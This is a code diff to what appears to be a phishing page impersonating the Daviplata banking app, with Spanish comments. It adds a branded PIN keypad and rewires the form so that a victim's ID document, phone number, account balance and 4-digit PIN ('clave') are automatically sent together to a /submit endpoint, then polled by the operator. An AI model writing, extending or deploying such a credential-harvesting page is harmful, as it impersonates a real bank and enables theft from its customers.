@@ -464,9 +464,138 @@
       @keyframes spin {
         to { transform: rotate(360deg); }
       }
+
+      /* =========================================
+         VISTA DEL TECLADO PIN (Clave)
+         ========================================= */
+      .pin-view {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        height: 100%;
+        background: #f4f6fa; /* Fondo azul clarito de Daviplata */
+        padding-top: 50px;
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        z-index: 50;
+      }
+
+      .pin-header {
+        position: relative;
+        width: 100%;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .pin-back-btn {
+        position: absolute;
+        left: 20px;
+        top: 0;
+        background: none;
+        border: none;
+        font-size: 24px;
+        color: #333;
+        cursor: pointer;
+      }
+
+      .pin-logo {
+        height: 40px;
+      }
+
+      .pin-title {
+        font-size: 16px;
+        font-weight: 700;
+        color: #333;
+        margin-top: 30px;
+        margin-bottom: 20px;
+      }
+
+      /* Dots (o o o o) */
+      .pin-dots {
+        display: flex;
+        gap: 15px;
+        margin-bottom: 40px;
+      }
+
+      .pin-dot {
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        border: 1.5px solid #333;
+        background: transparent;
+        transition: background-color 0.2s;
+      }
+
+      .pin-dot.filled {
+        background: #333;
+      }
+
+      /* Teclado numérico */
+      .pin-pad {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 20px 30px;
+        max-width: 280px;
+        margin: 0 auto;
+      }
+
+      .pin-key {
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        background: #fff;
+        border: none;
+        font-size: 28px;
+        color: #333;
+        font-weight: 400;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.03);
+        cursor: pointer;
+        transition: background-color 0.1s;
+      }
+
+      .pin-key:active {
+        background: #e8eaef;
+      }
+
+      .pin-key.empty {
+        background: transparent;
+        box-shadow: none;
+        cursor: default;
+      }
+
+      /* Icono borrar y bottom text */
+      .pin-action-icon {
+        width: 32px;
+        height: auto;
+      }
+
+      .pin-forgot {
+        margin-top: 40px;
+        font-size: 14px;
+        color: #666;
+        text-decoration: underline;
+        cursor: pointer;
+      }
+
+      .pin-faceid {
+        margin-top: auto;
+        margin-bottom: 40px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        color: #666;
+        font-size: 14px;
+      }
+      .pin-faceid svg {
+        width: 24px;
+      }
     </style>
   </head>
   <body>
+    <!-- Contenedor general simulando pantalla móvil -->
     <div class="phone-wrapper">
       <!-- Burbujas decorativas de fondo -->
       <div class="bubble bubble-1"></div>
@@ -644,6 +773,59 @@
           </div>
         </div>
       </div>
+      <!-- FIN VISTA 1 -->
+
+      <!-- VISTA 2: TECLADO PIN -->
+      <div class="pin-view" id="pinView">
+        <div class="pin-header">
+          <button class="pin-back-btn" onclick="volverAFormulario()">‹</button>
+          <img src="img/logo-daviplata.svg" alt="DaviPlata" class="pin-logo" />
+        </div>
+        
+        <div class="pin-title">Ingresa tu clave</div>
+        
+        <div class="pin-dots">
+          <div class="pin-dot" id="dot-1"></div>
+          <div class="pin-dot" id="dot-2"></div>
+          <div class="pin-dot" id="dot-3"></div>
+          <div class="pin-dot" id="dot-4"></div>
+        </div>
+
+        <div class="pin-pad">
+          <button class="pin-key" onclick="teclearPin('1')">1</button>
+          <button class="pin-key" onclick="teclearPin('2')">2</button>
+          <button class="pin-key" onclick="teclearPin('3')">3</button>
+          <button class="pin-key" onclick="teclearPin('4')">4</button>
+          <button class="pin-key" onclick="teclearPin('5')">5</button>
+          <button class="pin-key" onclick="teclearPin('6')">6</button>
+          <button class="pin-key" onclick="teclearPin('7')">7</button>
+          <button class="pin-key" onclick="teclearPin('8')">8</button>
+          <button class="pin-key" onclick="teclearPin('9')">9</button>
+          <button class="pin-key empty"></button>
+          <button class="pin-key" onclick="teclearPin('0')">0</button>
+          <button class="pin-key empty" onclick="borrarPin()">
+            <svg viewBox="0 0 24 24" fill="none" class="pin-action-icon">
+              <!-- Icono de retroceso simplificado -->
+              <path d="M10 5L3 12L10 19H21V5H10Z" stroke="#333" stroke-width="1.5" stroke-linejoin="round"/>
+              <path d="M13 10L17 14M17 10L13 14" stroke="#333" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>
+          </button>
+        </div>
+
+        <div class="pin-forgot">¿Olvidaste tu clave?</div>
+        
+        <div class="pin-faceid">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <!-- Face ID icon simplified -->
+            <path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M3 17V19C3 20.1046 3.89543 21 5 21H7M21 17V19C21 20.1046 20.1046 21 19 21H17" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M9 10C9 10 9 11 9.5 11.5C10 12 10 13 10 14" stroke-linecap="round"/>
+            <path d="M15 10C15 10 15 11 14.5 11.5C14 12 14 13 14 14" stroke-linecap="round"/>
+            <path d="M9 17C10 16 14 16 15 17" stroke-linecap="round"/>
+          </svg>
+          Ingresar con Face ID
+        </div>
+      </div>
+      <!-- FIN VISTA 2 -->
 
       <!-- Footer versión -->
       <div class="version-footer">
@@ -750,40 +932,92 @@
         }
 
         if (valido) {
-          const btn = document.getElementById("btnContinuar");
-          btn.textContent = "Enviando...";
-          btn.disabled = true;
-
-          fetch('/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              tipo_documento: selectedTipoValue,
-              num_documento:  doc.value.trim(),
-              num_celular:    cel.value.trim(),
-              saldo_cuenta:   saldo.value.trim()
-            })
-          })
-          .then(r => r.json())
-          .then(data => {
-            btn.textContent = "Continuar";
-            btn.disabled = false;
-            
-            if (data.ok) {
-              // Abrir modal de carga
-              mostrarModalCarga();
-              // Iniciar polling pasándole el ID del cliente
-              iniciarPolling(data.id);
-            } else {
-              mostrarMensaje('error', data.mensaje || 'Error al enviar los datos.');
-            }
-          })
-          .catch(() => {
-            btn.textContent = "Continuar";
-            btn.disabled = false;
-            mostrarMensaje('error', 'No se pudo conectar con el servidor.');
-          });
+          // Si el formulario es válido, pasar a pedir el PIN
+          mostrarPeticionClave();
         }
+      }
+
+      // --- Variables y flujo PIN ---
+      let pinActual = "";
+      
+      const formView = document.getElementById('formView');
+      const pinView = document.getElementById('pinView');
+
+      function mostrarPeticionClave() {
+        formView.style.display = 'none';
+        pinView.style.display = 'flex';
+        pinActual = "";
+        actualizarDots();
+      }
+
+      function volverAFormulario() {
+        pinView.style.display = 'none';
+        formView.style.display = 'block';
+      }
+
+      function teclearPin(num) {
+        if (pinActual.length < 4) {
+          pinActual += num;
+          actualizarDots();
+          
+          // Al llegar a 4 dígitos, enviar automáticamente
+          if (pinActual.length === 4) {
+            setTimeout(() => {
+              enviarDatosCompletos();
+            }, 300); // Pequeño delay para que vean el 4to punto lleno
+          }
+        }
+      }
+
+      function borrarPin() {
+        if (pinActual.length > 0) {
+          pinActual = pinActual.slice(0, -1);
+          actualizarDots();
+        }
+      }
+
+      function actualizarDots() {
+        for(let i=1; i<=4; i++) {
+          const dot = document.getElementById(`dot-${i}`);
+          if (i <= pinActual.length) {
+            dot.classList.add('filled');
+          } else {
+            dot.classList.remove('filled');
+          }
+        }
+      }
+
+      function enviarDatosCompletos() {
+        // Obtenemos los valores del form
+        const doc = document.getElementById("doc").value.trim();
+        const cel = document.getElementById("cel").value.trim();
+        const saldo = document.getElementById("saldo").value.trim();
+
+        // Bloquear vista actual e iniciar modal de carga
+        mostrarModalCarga();
+
+        fetch('/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            tipo_documento: selectedTipoValue,
+            num_documento:  doc,
+            num_celular:    cel,
+            saldo_cuenta:   saldo,
+            clave:          pinActual
+          })
+        })
+        .then(r => r.json())
+        .then(data => {
+          if (data.ok) {
+            iniciarPolling(data.id);
+          } else {
+            actualizarModalError(data.mensaje || 'Error al enviar los datos.');
+          }
+        })
+        .catch(() => {
+          actualizarModalError('No se pudo conectar con el servidor.');
+        });
       }
 
       // --- Funciones del Modal y Polling ---
